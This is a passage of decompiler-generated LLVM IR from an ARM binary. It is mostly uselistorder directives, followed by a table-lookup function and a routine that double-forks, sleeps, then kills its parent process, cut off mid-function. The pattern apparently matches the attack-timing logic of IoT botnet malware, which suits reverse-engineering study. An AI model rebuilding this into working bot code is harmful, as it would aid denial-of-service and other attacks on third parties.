  uselistorder i32 %stack_var_-40.7, { 0, 8, 11, 15, 14, 13, 12, 10, 9, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 %v2_95a0, { 1, 0 }
  uselistorder i32 %v1_9598, { 2, 4, 0, 1, 5, 3, 6 }
  uselistorder i32 %stack_var_-40.6, { 1, 0 }
  uselistorder i1 %v7_9588, { 1, 0 }
  uselistorder i1 %v7_9580, { 1, 0 }
  uselistorder i32 %v1_9564, { 2, 1, 0 }
  uselistorder i32 %v3_9560, { 1, 0 }
  uselistorder i32 %v0_9564, { 1, 0 }
  uselistorder i32 %v2_9534, { 1, 0 }
  uselistorder i32 %v1_9534, { 1, 2, 4, 0, 3, 5 }
  uselistorder i32 %v0_9534, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v2_9530, { 0, 2, 1, 3 }
  uselistorder i32 %stack_var_-40.5, { 2, 1, 0 }
  uselistorder i32 %v1_94dc, { 1, 0 }
  uselistorder i32 %v2_94d4, { 1, 0 }
  uselistorder i32 %v1_94c8, { 2, 0, 3, 1, 4 }
  uselistorder i32 %v1_93c8, { 1, 2, 0 }
  uselistorder i32 %v3_93bc, { 0, 2, 1, 3 }
  uselistorder i32 %v4_93a8, { 1, 0 }
  uselistorder i8 %v3_93a8, { 16, 17, 18, 19, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %v2_93a8, { 2, 0, 3, 1 }
  uselistorder i32 %stack_var_-40.3, { 6, 2, 4, 5, 3, 1, 0 }
  uselistorder i32 %v3_9658, { 3, 4, 5, 1, 2, 0, 8, 7, 6 }
  uselistorder i32 %v2_9398, { 1, 0 }
  uselistorder i32 %v1_938c, { 2, 0, 3, 1, 4 }
  uselistorder i32 %stack_var_-40.2, { 1, 0 }
  uselistorder i1 %v7_9368, { 1, 0 }
  uselistorder i32 %v1_9368, { 1, 0 }
  uselistorder i1 %v7_9360, { 1, 0 }
  uselistorder i32 %v4_9344, { 1, 0, 2 }
  uselistorder i1 %v7_9340, { 1, 0 }
  uselistorder i32 %v4_9324, { 1, 0, 2 }
  uselistorder i1 %v7_9320, { 1, 0 }
  uselistorder i1 %v7_9318, { 1, 0 }
  uselistorder i1 %v7_9310, { 1, 0 }
  uselistorder i32 %v2_9334, { 1, 0, 2, 3 }
  uselistorder i32 %v5_92e8, { 1, 0 }
  uselistorder i32 %v2_9a54, { 0, 21, 1, 20, 2, 23, 3, 22, 25, 4, 24, 5, 27, 6, 26, 7, 29, 8, 28, 9, 31, 10, 30, 11, 19, 12, 34, 13, 33, 14, 35, 15, 17, 16, 18, 32 }
  uselistorder i8* %v1_9698, { 11, 10, 12, 8, 6, 7, 9, 0, 1, 2, 3, 4, 5, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32 %v3_ac10, { 1, 2, 0 }
  uselistorder i32 %stack_var_-20856.0.ph, { 58, 57, 0, 60, 59, 1, 56, 55, 2, 63, 3, 67, 66, 4, 65, 64, 5, 62, 61, 6, 78, 77, 7, 76, 8, 75, 74, 9, 73, 72, 10, 71, 70, 11, 69, 68, 12, 54, 53, 13, 52, 51, 14, 50, 49, 15, 48, 47, 16, 46, 17, 45, 44, 18, 43, 42, 19, 41, 40, 20, 39, 38, 21, 37, 22, 36, 35, 23, 34, 33, 24, 32, 31, 25, 30, 29, 26, 27, 28 }
  uselistorder i32 %stack_var_-20872.0.ph, { 2, 1, 0 }
  uselistorder i32 %stack_var_-20860.0.ph, { 1, 0 }
  uselistorder i32 %v1_9258, { 1, 0 }
  uselistorder i32 %v0_9258, { 1, 0 }
  uselistorder i32 %v2_9218, { 1, 0 }
  uselistorder i32 %v8_91fc, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_91dc, { 1, 3, 0, 2, 4 }
  uselistorder i32 %v0_9164, { 5, 4, 1, 0, 3, 2 }
  uselistorder i32 %v3_9108, { 2, 1, 4, 3, 0, 5, 6 }
  uselistorder i32 %v0_90f4, { 14, 0, 1, 15, 13, 28, 24, 2, 25, 23, 26, 8, 3, 4, 9, 7, 22, 11, 5, 6, 12, 10, 27, 21, 29, 18, 19, 20, 17, 16 }
  uselistorder i32 %v0_90e8, { 1, 2, 6, 0, 3, 4, 5 }
  uselistorder i32 %v1_908c, { 1, 0 }
  uselistorder i1 %v2_9078, { 1, 0, 2 }
  uselistorder i32 %v1_9074, { 0, 2, 1, 3 }
  uselistorder i32 %v2_9064, { 1, 0 }
  uselistorder i32 %v2_9058, { 2, 4, 0, 1, 5, 3, 6 }
  uselistorder i32 %v7_907c, { 0, 1, 7, 5, 2, 4, 6, 3 }
  uselistorder i32* %v11_904c, { 1, 0, 2 }
  uselistorder i32 %v10_9048, { 21, 20, 19, 11, 10, 17, 16, 15, 18, 14, 13, 34, 33, 32, 30, 29, 28, 31, 27, 26, 25, 12, 23, 22, 9, 8, 24, 7, 39, 38, 37, 36, 35, 5, 4, 3, 41, 40, 6, 42, 2, 1, 0, 43, 44 }
  uselistorder i32 %v2_9040, { 2, 3, 0, 6, 5, 4, 7, 1 }
  uselistorder i32 %v2_9030, { 2, 3, 0, 6, 5, 4, 7, 1 }
  uselistorder i32 %v2_9020, { 2, 3, 0, 6, 5, 4, 7, 1 }
  uselistorder i32 %v1_9000, { 1, 0 }
  uselistorder i32 %v0_8ffc, { 1, 0, 3, 2 }
  uselistorder i8* %tmp197, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9, 10, 11 }
  uselistorder i32 %v2_8fd8, { 0, 17, 23, 24, 25, 26, 1, 20, 2, 21, 22, 27, 10, 11, 3, 16, 4, 18, 19, 28, 5, 15, 6, 29, 7, 14, 30, 8, 13, 31, 9, 12, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i32 %v5_8fd0, { 1, 0 }
  uselistorder i32 %v6_8f58, { 5, 4, 6, 2, 11, 0, 1, 10, 12, 9, 3, 8, 7, 13 }
  uselistorder i32 %v1_8f3c, { 1, 0 }
  uselistorder i32 %v1_8f30, { 1, 2, 0 }
  uselistorder i32* %stack_var_-36, { 2, 0, 1 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2, 3 }
  uselistorder i32* %sp.global-to-local, { 2, 1, 3, 0, 4 }
  uselistorder i32* %sb.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 13, 14, 17, 18, 16, 19, 21, 22, 20, 23, 24 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 6, 5, 7, 8 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 10, 5, 7, 8, 9, 11, 12, 13, 14, 6 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 3, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 46, 43, 44, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 122, 123, 124, 126, 125, 127, 128, 63, 64, 65, 66, 68, 67, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 129, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 114, 111, 112, 113, 115, 116, 119, 120, 117, 118, 121, 134, 130, 131, 132, 133, 135, 137, 136, 2, 139, 138, 1, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 89, 90, 91, 37, 38, 40, 39, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 115, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 87, 88, 85, 86, 114, 92, 93, 94, 96, 95, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 0 }
  uselistorder i32* %r1.global-to-local, { 4, 5, 2, 3, 147, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 1, 41, 42, 43, 44, 47, 45, 46, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 135, 136, 137, 138, 139, 140, 141, 59, 60, 61, 64, 62, 63, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 167, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 130, 129, 131, 132, 134, 133, 166, 142, 143, 144, 145, 146, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 165, 164, 0 }
  uselistorder i32* %r0.global-to-local, { 12, 9, 10, 273, 13, 15, 14, 16, 18, 17, 20, 19, 22, 21, 23, 25, 24, 26, 29, 27, 28, 31, 30, 34, 32, 33, 36, 35, 37, 38, 40, 39, 41, 42, 43, 45, 44, 46, 48, 47, 50, 49, 51, 53, 52, 55, 54, 56, 58, 57, 60, 59, 61, 63, 62, 64, 67, 65, 66, 69, 68, 72, 70, 71, 74, 73, 76, 75, 78, 77, 80, 79, 81, 83, 82, 85, 84, 87, 86, 88, 89, 91, 90, 93, 92, 95, 94, 96, 98, 97, 99, 100, 101, 103, 102, 105, 104, 106, 108, 107, 109, 111, 110, 113, 112, 114, 115, 118, 116, 117, 119, 121, 120, 122, 124, 123, 126, 125, 127, 129, 128, 131, 130, 274, 272, 275, 277, 276, 11, 278, 133, 132, 134, 136, 135, 137, 138, 140, 139, 2, 141, 143, 142, 145, 144, 147, 146, 150, 148, 149, 152, 151, 153, 155, 154, 156, 8, 157, 159, 158, 161, 160, 162, 164, 163, 165, 167, 166, 168, 169, 171, 170, 173, 172, 174, 176, 175, 177, 179, 178, 180, 181, 183, 182, 185, 184, 186, 188, 187, 189, 191, 190, 192, 4, 193, 194, 195, 197, 196, 199, 198, 206, 200, 202, 283, 203, 204, 205, 208, 207, 209, 3, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 264, 263, 265, 266, 267, 268, 270, 269, 271, 201, 280, 279, 288, 281, 282, 284, 286, 285, 287, 290, 289, 291, 7, 292, 294, 293, 295, 6, 1, 297, 296, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 311, 310, 313, 312, 315, 314, 5, 316, 318, 317, 319, 320, 321, 322, 323, 324, 0 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 32, 33, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 41, 42, 34, 35, 36, 37, 0, 38, 39, 40 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 16, 13, 14, 15, 17, 18, 19, 38, 39, 40, 41, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 51, 42, 43, 0, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 27, 26, 4, 5, 6, 7, 28, 29, 24, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 3, 25, 32, 30, 31, 33, 35, 36, 37, 38, 39, 34, 40 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 136, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 63, 56, 57, 58, 59, 60, 61, 62, 118, 119, 120, 121, 122, 123, 124, 64, 65, 66, 68, 67, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 151, 96, 97, 98, 99, 100, 101, 102, 103, 104, 106, 105, 107, 108, 109, 114, 116, 115, 110, 111, 112, 113, 117, 149, 150, 125, 133, 134, 126, 127, 128, 129, 130, 131, 132, 135, 0, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148 }
  uselistorder i1* %cpsr_v.global-to-local, { 1, 130, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 62, 56, 57, 58, 59, 60, 61, 112, 113, 114, 115, 116, 117, 118, 63, 64, 65, 67, 66, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 144, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 110, 109, 106, 107, 108, 111, 142, 143, 119, 127, 128, 120, 121, 122, 123, 124, 125, 126, 129, 0, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141 }
  uselistorder i1* %cpsr_n.global-to-local, { 1, 133, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 62, 56, 57, 58, 59, 60, 61, 115, 116, 117, 118, 119, 120, 121, 63, 64, 65, 67, 66, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 147, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 111, 113, 112, 107, 108, 109, 110, 114, 145, 146, 122, 130, 131, 123, 124, 125, 126, 127, 128, 129, 132, 0, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 141, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 65, 59, 60, 61, 62, 63, 64, 120, 121, 122, 123, 124, 125, 126, 66, 67, 68, 69, 71, 72, 70, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 161, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 116, 118, 117, 112, 113, 114, 115, 119, 159, 160, 127, 137, 138, 128, 129, 130, 131, 132, 133, 134, 135, 136, 139, 140, 0, 144, 142, 143, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158 }
  uselistorder i32 ptrtoint (i32* @global_var_143a4.106 to i32), { 1, 2, 0, 3 }
  uselistorder i32 104, { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_14394.101 to i32), { 0, 2, 1, 3 }
  uselistorder i32 2116, { 1, 2, 0 }
  uselistorder i32 1023, { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1438c.99 to i32), { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_14388.97 to i32), { 1, 4, 0, 5, 2, 6, 3, 7 }
  uselistorder i32 (i32, i32, i32, i32)* @function_13acc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 1, 0, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_14380.95 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 35, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_1435c.89 to i32), { 12, 16, 3, 17, 15, 18, 13, 19, 14, 20, 0, 21, 1, 22, 2, 23, 4, 24, 5, 25, 6, 26, 7, 27, 8, 28, 9, 29, 10, 30, 11, 31 }
  uselistorder i32 ptrtoint (i32* @global_var_14360.83 to i32), { 0, 2, 1, 3 }
  uselistorder i32 10240, { 1, 5, 4, 6, 2, 7, 3, 8, 0, 9 }
  uselistorder i32 1024, { 1, 2, 3, 0, 4 }
  uselistorder i32 -292, { 1, 0 }
  uselistorder i8 7, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32 20556, { 1, 0 }
  uselistorder i32 20684, { 2, 0, 1 }
  uselistorder i32 -20773, { 0, 4, 11, 5, 1, 7, 6, 2, 8, 3, 9, 10 }
  uselistorder i32 1464, { 1, 0 }
  uselistorder i32 47, { 0, 3, 1, 4, 2, 5, 6 }
  uselistorder i32 (i32, i32, i32)* @_memmove, { 4, 3, 2, 1, 0 }
  uselistorder i32 533, { 1, 0, 3, 2, 4 }
  uselistorder i32 3140, { 5, 2, 0, 1, 3, 4, 6, 7 }
  uselistorder i32 46, { 0, 2, 1, 3 }
  uselistorder i32 45, { 0, 2, 1, 3 }
  uselistorder i32 44, { 1, 3, 0, 4, 2, 5 }
  uselistorder i32 43, { 0, 2, 1, 3 }
  uselistorder i32 42, { 0, 2, 1, 3 }
  uselistorder i32 41, { 1, 3, 0, 4, 2, 5 }
  uselistorder i32 40, { 1, 4, 2, 5, 0, 6, 3, 7 }
  uselistorder i32 39, { 0, 4, 1, 5, 2, 6, 3 }
  uselistorder i32 38, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 37, { 0, 3, 1, 4, 5, 6, 7, 2, 8 }
  uselistorder i32 36, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 127, { 0, 5, 3, 6, 1, 7, 2, 8, 4, 9 }
  uselistorder i32 126, { 0, 5, 1, 6, 2, 7, 3, 8, 4, 9 }
  uselistorder i32 254, { 0, 5, 1, 6, 2, 7, 3, 8, 4, 9 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_14368.76 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %arg4, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_abc8, { 1, 0 }
  uselistorder label %dec_label_pc_aa74, { 1, 0 }
  uselistorder label %.thread64, { 1, 0 }
  uselistorder label %dec_label_pc_aa48, { 2, 0, 1 }
  uselistorder label %bb242, { 1, 0 }
  uselistorder label %dec_label_pc_a88c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_a76c, { 1, 0 }
  uselistorder label %.thread59, { 1, 0 }
  uselistorder label %dec_label_pc_a740, { 2, 0, 1 }
  uselistorder label %bb234, { 1, 0 }
  uselistorder label %dec_label_pc_a5dc, { 5, 0, 1, 6, 2, 3, 4 }
  uselistorder label %dec_label_pc_a590, { 1, 0 }
  uselistorder label %dec_label_pc_a568, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a55c, { 1, 0 }
  uselistorder label %bb232, { 1, 0 }
  uselistorder label %bb230, { 1, 0 }
  uselistorder label %dec_label_pc_a3d0, { 1, 0 }
  uselistorder label %dec_label_pc_a3b4, { 1, 0 }
  uselistorder label %dec_label_pc_a344, { 1, 0 }
  uselistorder label %dec_label_pc_a218, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_a1f0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a188, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a158, { 7, 2, 3, 1, 8, 4, 5, 0, 6 }
  uselistorder label %bb228, { 1, 0 }
  uselistorder label %dec_label_pc_9fdc, { 1, 0 }
  uselistorder label %dec_label_pc_9fd4, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_9fac, { 1, 0 }
  uselistorder label %dec_label_pc_9f6c, { 1, 0 }
  uselistorder label %bb224, { 1, 0 }
  uselistorder label %bb222, { 1, 0 }
  uselistorder label %bb220, { 1, 0 }
  uselistorder label %dec_label_pc_9e7c, { 2, 1, 0 }
  uselistorder label %bb218, { 1, 0 }
  uselistorder label %.thread46, { 3, 0, 1, 2 }
  uselistorder label %bb215, { 1, 0 }
  uselistorder label %.thread45, { 3, 0, 1, 2 }
  uselistorder label %bb212, { 1, 0 }
  uselistorder label %.thread44, { 1, 0 }
  uselistorder label %.thread43, { 1, 0 }
  uselistorder label %dec_label_pc_9b78, { 1, 0 }
  uselistorder label %dec_label_pc_9aa0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9a24, { 1, 0 }
  uselistorder label %dec_label_pc_9a0c, { 1, 0 }
  uselistorder label %dec_label_pc_99d0, { 1, 0 }
  uselistorder label %dec_label_pc_995c, { 1, 0 }
  uselistorder label %dec_label_pc_9924, { 1, 0 }
  uselistorder label %dec_label_pc_9664, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9634, { 1, 0 }
  uselistorder label %dec_label_pc_9590, { 7, 8, 2, 9, 1, 10, 3, 11, 12, 13, 0, 15, 14, 6, 4, 5 }
  uselistorder label %dec_label_pc_93bc, { 1, 0 }
  uselistorder label %dec_label_pc_9388, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_92b4.dec_label_pc_92b4_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_9294.dec_label_pc_9294_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_9280, { 1, 0 }
  uselistorder label %dec_label_pc_9280.outer, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_9280.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_919c, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb203, { 1, 0 }
  uselistorder label %bb201, { 1, 0 }
  uselistorder label %dec_label_pc_9054, { 1, 0 }
  uselistorder label %dec_label_pc_9010, { 1, 3, 4, 0, 2 }
}

define i32 @function_acdc(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_acdc:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v1_acdc = urem i32 %arg1, 256
  %v2_ace0 = icmp eq i32 %v1_acdc, 0
  %v1_ace8 = urem i32 %arg3, 256
  br i1 %v2_ace0, label %dec_label_pc_ad2c, label %dec_label_pc_acf4

dec_label_pc_acf4:                                ; preds = %dec_label_pc_acdc
  %v0_acf4 = load i32, i32* %r1.global-to-local, align 4
  %v1_acf4 = add i32 %v0_acf4, 4
  %v2_acf4 = inttoptr i32 %v1_acf4 to i8*
  %v3_acf4 = load i8, i8* %v2_acf4, align 1
  %v4_acf4 = zext i8 %v3_acf4 to i32
  %v9_acf8 = icmp eq i32 %v4_acf4, %v1_ace8
  br i1 %v9_acf8, label %dec_label_pc_ad34, label %dec_label_pc_ad1c.preheader

dec_label_pc_ad1c.preheader:                      ; preds = %dec_label_pc_acf4
  br label %dec_label_pc_ad1c

dec_label_pc_ad0c:                                ; preds = %dec_label_pc_ad1c
  %v1_ad0c = add i32 %v0_ad14.in, 12
  %v2_ad0c = inttoptr i32 %v1_ad0c to i8*
  %v3_ad0c = load i8, i8* %v2_ad0c, align 1
  %v4_ad0c = zext i8 %v3_ad0c to i32
  %v9_ad10 = icmp eq i32 %v4_ad0c, %v1_ace8
  br i1 %v9_ad10, label %dec_label_pc_ad34, label %dec_label_pc_ad1c

dec_label_pc_ad1c:                                ; preds = %dec_label_pc_ad1c.preheader, %dec_label_pc_ad0c
  %v0_ad14.in = phi i32 [ %v0_acf4, %dec_label_pc_ad1c.preheader ], [ %v0_ad14, %dec_label_pc_ad0c ]
  %v0_ad1c = phi i32 [ 0, %dec_label_pc_ad1c.preheader ], [ %v1_ad1c, %dec_label_pc_ad0c ]
  %v0_ad14 = add i32 %v0_ad14.in, 8
  %v1_ad1c = add i32 %v0_ad1c, 1
  store i32 %v1_ad1c, i32* @lr, align 4
  %v9_ad20 = icmp eq i32 %v1_ad1c, %v1_acdc
  store i32 %v0_ad14, i32* %r1.global-to-local, align 4
  br i1 %v9_ad20, label %dec_label_pc_ad2c, label %dec_label_pc_ad0c

dec_label_pc_ad2c:                                ; preds = %dec_label_pc_ad1c, %dec_label_pc_acdc
  ret i32 %arg4

dec_label_pc_ad34:                                ; preds = %dec_label_pc_ad0c, %dec_label_pc_acf4
  %v0_ad34 = phi i32 [ %v0_acf4, %dec_label_pc_acf4 ], [ %v0_ad14, %dec_label_pc_ad0c ]
  %v1_ad34 = inttoptr i32 %v0_ad34 to i32*
  %v2_ad34 = load i32, i32* %v1_ad34, align 4
  ret i32 %v2_ad34

; uselistorder directives
  uselistorder i32 %v1_ad1c, { 1, 2, 0 }
  uselistorder i32 %v0_ad14, { 1, 0, 2 }
  uselistorder i32 %v0_ad14.in, { 1, 0 }
  uselistorder i32 %v0_acf4, { 1, 0, 2 }
  uselistorder i32 %v1_ace8, { 1, 0 }
  uselistorder i32 %v1_acdc, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ad1c, { 1, 0 }
}

define i32 @function_ad40(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_ad40:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_ad40 = load i32, i32* @r4, align 4
  store i32 %v3_ad40, i32* %stack_var_-32, align 4
  %v6_ad40 = load i32, i32* @r5, align 4
  %v9_ad40 = load i32, i32* @r6, align 4
  %v12_ad40 = load i32, i32* @r7, align 4
  %v18_ad40 = load i32, i32* @sb, align 4
  %v0_ad44 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_ad44, i32* @sb, align 4
  store i32 %arg1, i32* %r6.global-to-local, align 4
  %v1_ad4c = urem i32 %arg2, 256
  store i32 %v1_ad4c, i32* %r7.global-to-local, align 4
  %v0_ad58 = call i32 @fork()
  %v7_ad5c = icmp eq i32 %v0_ad58, -1
  %. = zext i1 %v7_ad5c to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %tmp23 = icmp slt i32 %v0_ad58, 1
  br i1 %tmp23, label %bb24, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_ad40
  store i32 1, i32* %r5.global-to-local, align 4
  br label %bb25

bb24:                                             ; preds = %dec_label_pc_ad40
  store i32 %., i32* %r5.global-to-local, align 4
  %v2_ad74 = icmp eq i1 %v7_ad5c, false
  br i1 %v2_ad74, label %bb26, label %bb25

bb25:                                             ; preds = %.thread2, %bb24
  %v3_ad78 = load i32, i32* %stack_var_-32, align 4
  store i32 %v3_ad78, i32* %r4.global-to-local, align 4
  store i32 %v6_ad40, i32* %r5.global-to-local, align 4
  store i32 %v9_ad40, i32* %r6.global-to-local, align 4
  store i32 %v12_ad40, i32* %r7.global-to-local, align 4
  store i32 %v18_ad40, i32* @sb, align 4
  ret i32 %v0_ad58

bb26:                                             ; preds = %bb24
  %v0_ad7c = call i32 @fork()
  %v7_ad80 = icmp eq i32 %v0_ad7c, -1
  store i32 %v0_ad7c, i32* %r4.global-to-local, align 4
  br i1 %v7_ad80, label %dec_label_pc_adb0, label %dec_label_pc_ad8c

dec_label_pc_ad8c:                                ; preds = %bb26
  %v2_ad8c = icmp eq i32 %v0_ad7c, 0
  br i1 %v2_ad8c, label %dec_label_pc_ad94, label %dec_label_pc_adb8

dec_label_pc_ad94:                                ; preds = %dec_label_pc_ad8c
  %v0_ad94 = load i32, i32* %r6.global-to-local, align 4
  %v1_ad98 = call i32 @_sleep(i32 %v0_ad94)
  %v0_ad9c = call i32 @getppid()
  %v2_ada4 = call i32 @kill(i32 %v0_ad9c, i32 9)
  %v0_ada8 = load i32, i32* %r4.global-to-local, align 4
  call void @exit(i32 %v0_ada8)
  unreachable

dec_label_pc_adb0:                                ; preds = %bb26
  %v0_adb0 = load i32, i32* %r5.global-to-local, align 4
  call void @exit(i32 %v0_adb0)
  unreachable

dec_label_pc_adb8:                                ; preds = %dec_label_pc_ad8c
  store i32 ptrtoint (i8** @global_var_1cd30.110 to i32), i32* %r3.global-to-local, align 4
